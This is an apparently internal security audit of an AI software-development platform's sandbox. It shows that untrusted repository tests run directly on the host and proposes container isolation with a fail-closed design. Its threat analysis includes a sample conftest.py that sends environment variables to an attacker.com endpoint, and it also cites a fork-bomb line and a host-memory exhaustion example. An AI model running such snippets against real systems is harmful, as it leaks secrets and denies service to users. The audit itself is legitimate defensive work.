# Existing Execution Architecture Audit & Security Analysis
**Target:** AI-Powered Software Development Platform — Secure Sandbox Execution Architecture (Issue #200 / F20)  
**Date:** November 2026  
**Auditor:** Senior Backend & Application Security Architecture Team  

---

## 1. Executive Summary

The AI-Powered Software Development Platform currently allows automated agents to plan tasks, modify files, run tests, verify diffs, and generate pull requests across external GitHub repositories. While application-level validation controls (path traversal checks, command allowlists, secret redaction, and output limits) were implemented during earlier milestones, **untrusted repository code is executed directly as subprocesses on the host API server operating system**.

In production deployments (such as Azure App Service), executing repository-controlled test suites (`pytest`, `unittest`, `npm test`) or build steps directly on the host poses critical security vulnerabilities:
1. Malicious `conftest.py`, `setup.py`, `package.json` lifecycle scripts, or custom test fixtures execute with the exact OS privileges of the host API service.
2. Sibling processes, host file descriptors, OS environment variables, internal cloud network endpoints (e.g., Azure Instance Metadata Service `169.254.169.254`), and the container runtime can be targeted.
3. There are no kernel-level memory, CPU, or PID limits; a simple fork-bomb or unbounded memory allocation exhausts host resources and denies service to all platform users.

This audit establishes a complete catalog of execution entry points, documents root causes and exploit scenarios, and details the technical architecture needed to replace host subprocess execution with a containerized, userspace-kernel-isolated runner architecture.

---

## 2. Component-by-Component Architectural Audit

### 2.1 WorkspaceManager (`backend/sandbox/workspace_manager.py`)
- **Primary Class:** `WorkspaceManager`
- **Location:** `backend/sandbox/workspace_manager.py` (lines 115–2107)
- **Responsibilities:**
  - Manages per-task working directories under `.workspaces/` (or configured base directory).
  - Isolates repository modifications using Git worktrees (`git worktree add -b <branch> <path> <base_ref>`), with a directory-copy fallback when worktrees fail or git metadata is detached.
  - Houses the bound `WorkspaceCommandRunner`, `WorkspaceTestRunner`, `WorkspaceDiffVerifier`, and `WorkspaceResourceMonitor` instances.
  - Implements workspace lifecycle states: `NOT_CREATED` -> `CREATING` -> `READY` -> `IN_USE` -> `PAUSED` -> `COMPLETED` / `FAILED` -> `CLEANED_UP`.
- **Findings & Security Characteristics:**
  - **Worktree Shared Metadata:** Git worktrees share the underlying repository's `.git/` object store and configuration. While `WorkspacePathGuard` forbids direct traversal into `.git/`, Git commands executed inside the worktree can read shared git configurations or hooks if not strictly invoked with `git -c core.hooksPath=/dev/null`.
  - **Directory Copy Fallback:** Fallback copying recursively copies files, preserving symlinks. If a repository contains symlinks pointing to absolute paths or climbing parents, copying without resolve-checks can expose unexpected host paths.
  - **Workspace Concurrency:** Workspaces are locked per task ID via `self._task_locks[task_id]` (a `threading.Lock`). While this prevents intra-task thread collisions, it does not prevent multi-process API worker collisions across clustered instances.

### 2.2 WorkspacePathGuard (`backend/sandbox/path_guard.py`)
- **Primary Class:** `WorkspacePathGuard`
- **Location:** `backend/sandbox/path_guard.py` (lines 34–142)
- **Responsibilities:**
  - Validates proposed workspace roots via `validate_workspace_root`: rejects null bytes, traversal `..`, UNC paths (`\\server\share`), system directories (`/etc`, `/bin`, `C:\Windows`), and platform repository roots (`_REPO_ROOT`, `backend`, `frontend`).
  - Resolves target files via `resolve_within_workspace`: ensures all candidate paths stay strictly confined within `workspace_root` using `app.core.input_security.is_within`.
  - Blocks access to `.git` metadata and internals, `.env` environment files, and SSH/TLS private keys via `DANGEROUS_PATH_SEGMENTS`.
- **Findings & Security Characteristics:**
  - Robust application-level path filtering.
  - **Limitation:** Application-level path guards only protect file read/write operations mediated by the Python API. When `WorkspaceCommandRunner` invokes `pytest` or `npm`, the child process executes native C/Python calls directly against the host OS filesystem without passing through `WorkspacePathGuard`.

### 2.3 WorkspaceResourceMonitor (`backend/sandbox/resource_monitor.py`)
- **Primary Class:** `WorkspaceResourceMonitor`
- **Location:** `backend/sandbox/resource_monitor.py` (lines 17–75)
- **Responsibilities:**
  - Enforces workspace disk quotas (`limits.max_disk_bytes`, default 500 MB).
  - Enforces individual file size caps (`limits.max_file_size_bytes`, default 5 MB).
  - Tracks file modifications (`limits.max_files_modified`, default 50 files).
  - Tracks streaming output limits (`MAX_COMMAND_OUTPUT_BYTES`, default 100 KB).
- **Findings & Security Characteristics:**
  - Checks are currently enforced *after* or *around* Python-level file writes.
  - **Limitation:** Subprocesses executed in the workspace can create temporary files in `/tmp` or write gigabytes directly to disk before the Python resource monitor ever inspects them. Disk quotas must be enforced by OS-level or container-level storage quotas.

### 2.4 WorkspaceCommandRunner (`backend/sandbox/command_runner.py`)
- **Primary Class:** `WorkspaceCommandRunner`
- **Location:** `backend/sandbox/command_runner.py` (lines 129–421)
- **Responsibilities:**
  - Validates commands against `ALLOWED_COMMAND_TEMPLATES` (`pytest`, `python`, `npm`, `npx`, `git`, `node`, `ruff`, etc.).
  - Rejects shell injection metacharacters (pipes `|`, redirects `>`, `;`, `&`, null bytes).
  - Strips host environment variables, retaining only safe system keys (`PATH`, `HOME`, `LANG`, `TMP`).
  - Sets offline flags: `PIP_NO_INDEX=1`, `NPM_CONFIG_OFFLINE=true`, `NO_PROXY=*`.
  - Executes commands using `subprocess.Popen` with process group isolation (`start_new_session=True`).
  - Terminates runaway process trees on timeout using `kill_process_tree` (`SIGKILL` to `os.killpg`).
  - Streams and caps captured stdout and stderr to 100 KB (`_drain_and_capture_stream`).
  - Redacts sensitive patterns via `app.core.secret_redaction.redact`.
- **Critical Security Gaps (The P0 Vulnerability):**
  - **Direct Host Execution:** Line 275 sets `exec_cmd = sys.executable` and Line 279 sets `cmd_list = [sys.executable, "-m", "pytest", *args]`. The API server's Python binary runs untrusted test code directly on the host API server!
  - **Shared Filesystem:** The child process inherits the full filesystem privileges of the API server process. Even though `cwd` is set to the workspace directory, the child process can call `open("/etc/passwd")`, inspect host processes via `/proc`, or read other users' workspaces.
  - **Shared Network Namespace:** Offline environment variables (`PIP_NO_INDEX`, `NO_PROXY`) only constrain cooperative libraries (like `pip` or HTTP clients respecting proxy variables). Raw socket connections (`socket.socket()`) or malicious C extensions bypass proxy variables immediately and exfiltrate host data over outbound TCP/UDP.
  - **Unbounded Host Resources:** There are no cgroups, `setrlimit`, or container limits. An untrusted repository can consume 100% of the host CPU, allocate 32 GB of RAM, or launch 10,000 threads.

### 2.5 WorkspaceTestRunner (`backend/sandbox/test_runner.py`)
- **Primary Class:** `WorkspaceTestRunner`
- **Location:** `backend/sandbox/test_runner.py` (lines 1–716)
- **Responsibilities:**
  - Discovers repository test frameworks (pytest, unittest, jest).
  - Refuses unsupported runners (`cargo`, `go`, `mvn`) and ambiguous setups.
  - Validates test requests and arguments.
  - Calls `self._command_runner.run_command(...)` to execute test suites.
  - Parses structured results (exit codes, passed/failed counts, durations, error traces).
  - Enforces the 3-attempt bounded repair loop ceiling per ADR-010.
- **Findings:**
  - Because `WorkspaceTestRunner` delegates entirely to `WorkspaceCommandRunner`, transitioning `WorkspaceCommandRunner` to a pluggable `SandboxBackend` will secure all test executions transparently without altering `WorkspaceTestRunner`'s parsing logic.

---

## 3. Execution Entry-Point Inventory

A thorough search across the entire backend identifies all subprocess invocations and command execution sites:

| File Path | Function / Class | Execution Method | Command Executed | Untrusted Code? | Required Isolation |
|---|---|---|---|---|---|
| `backend/sandbox/command_runner.py:291` | `WorkspaceCommandRunner.run_command` | `subprocess.Popen` | `pytest`, `python`, `npm`, `node` | **YES (CRITICAL)** | Must run in `ContainerBackend` / Runner Service |
| `backend/sandbox/command_runner.py:407` | `WorkspaceCommandRunner.execute_raw_command` | `subprocess.run` | Internal git management commands | Low (Internal git) | Host git operations with `-c core.hooksPath=/dev/null` |
| `backend/sandbox/workspace_manager.py:287` | `WorkspaceManager._create_worktree` | `subprocess.run` | `git worktree add`, `git branch` | Low (Trusted git) | Host git with sanitized flags |
| `backend/sandbox/workspace_manager.py:350` | `WorkspaceManager._create_copy_workspace` | `subprocess.run` | `git init`, `git config` | Low (Trusted git) | Host git |
| `backend/sandbox/diff_verifier.py:348` | `WorkspaceDiffVerifier.compute_diff` | `subprocess.run` | `git diff`, `git status` | Low (Trusted git) | Host git |
| `backend/review/static_reviewer.py:191` | `StaticReviewer._run_linter` | `subprocess.run` | `ruff`, `eslint`, `biome` | **MEDIUM** (Eslint plugins can run code) | Sandbox runner or restricted subprocess |
| `backend/app/services/task_execution_orchestrator.py:841` | `TaskExecutionOrchestrator` | `subprocess.run` | `git diff` | Low (Git diff) | Host git |
| `backend/app/services/task_execution_orchestrator.py:1717` | `TaskExecutionOrchestrator` | `subprocess.run` | `git worktree remove` | Low (Git worktree) | Host git |
| `backend/app/services/git_branch.py:464` | `GitBranchService` | `asyncio.create_subprocess_exec` | `git checkout`, `git branch` | Low (Git ops) | Host git with argument validation |
| `backend/app/integrations/github/service.py:531` | `GitHubIntegrationService` | `asyncio.create_subprocess_exec` | `git clone`, `git fetch` | Low (Cloning) | Host git with strict URL validation |

---

## 4. Security Gap & Threat Analysis

### Gap 1: Host Process Execution of Untrusted Code (CRITICAL)
- **Vulnerability:** Untrusted test scripts and test fixtures run directly on the API server via `sys.executable`.
- **Root Cause:** Absence of execution boundary abstraction; `WorkspaceCommandRunner` directly invokes local `subprocess.Popen`.
- **Exploitation Scenario:** An attacker submits a repository containing a `tests/conftest.py` with:
  ```python
  import os, urllib.request
  urllib.request.urlopen("https://attacker.com/exfil", data=str(dict(os.environ)).encode())
  ```
  When the agent runs tests, `pytest` executes `conftest.py` on the host, sending all platform secrets to the attacker.
- **Impact:** Complete compromise of API secrets, database credentials, LLM keys, and cloud environment.
- **Required Mitigation:** Hard fail-closed container isolation with `--network=none` and read-only root filesystem.

### Gap 2: Cross-Task Workspace Access (HIGH)
- **Vulnerability:** One task can inspect or alter files belonging to another concurrent task workspace.
- **Root Cause:** All task workspaces reside in subdirectories of the same `.workspaces/` parent directory on the host. Without OS mount isolation, any subprocess running in `.workspaces/task-A` can access `../task-B`.
- **Exploitation Scenario:** Malicious test script in Task A reads files from `../task-B/secrets.json` or modifies Task B's source code before Task B commits.
- **Impact:** Cross-tenant data exfiltration, integrity violation, unauthorized code tampering.
- **Required Mitigation:** Bind-mount only the assigned task directory (`/sandbox/workspaces/<task_id>` -> `/workspace`) into the container.

### Gap 3: Resource Starvation / Denial of Service (HIGH)
- **Vulnerability:** Unbounded memory, CPU, and thread/process creation.
- **Root Cause:** No cgroup limits or `setrlimit` boundaries on child processes.
- **Exploitation Scenario:** A test case executes `while True: os.fork()` (fork-bomb) or allocates `bytearray(64 * 1024**3)` (OOM).
- **Impact:** Host API server crashes, taking down the entire platform for all users.
- **Required Mitigation:** Enforce container resource limits: `--cpus=2`, `--memory=4g`, `--pids-limit=512`.

### Gap 4: Production Fallback to Local Subprocess (CRITICAL)
- **Vulnerability:** If container runtime or runner is unavailable in production, silently falling back to host execution leaves the platform vulnerable.
- **Root Cause:** Missing explicit environment validation and fail-closed architecture.
- **Required Mitigation:** `LocalSubprocessBackend` must be strictly restricted to `APP_ENV=development`. In production (`APP_ENV=production`), initialization and execution must fail closed immediately if secure container runner is not configured or unavailable.

---

## 5. Architectural Recommendations & Roadmap

1. **Pluggable SandboxBackend Abstraction:**
   - Define abstract `SandboxBackend` with typed lifecycle methods: `create_workspace`, `execute`, `read_file`, `write_file`, `get_diff`, `destroy_workspace`.
   - Implement `LocalSubprocessBackend` (for development only) and `ContainerBackend` / `RunnerClient` (for production).
   - Implement `SandboxFactory` with strict fail-closed enforcement:
     ```python
     if settings.is_production and backend_name == "local":
         raise SecurityConfigurationError("LocalSubprocessBackend is strictly forbidden in production.")
     ```

2. **Dedicated Runner Service:**
   - Standalone microservice running on a secure Linux container host.
   - Authenticated via client bearer token over TLS (`RUNNER_AUTH_SECRET`).
   - Narrow API endpoints with zero access to LLM keys or database credentials.

3. **Two-Phase Execution Strategy:**
   - **Phase A (Dependency Installation):** Controlled sandbox environment with restricted network access to package registries, download limits, and strict timeouts.
   - **Phase B (Offline Test Execution):** Executed in an isolated container with `--network=none`, `--read-only`, and full resource limits.

4. **Defense-in-Depth Retention:**
   - Retain `WorkspacePathGuard`, `WorkspaceResourceMonitor`, argument sanitization, secret redaction, and output caps inside both local and container backends.
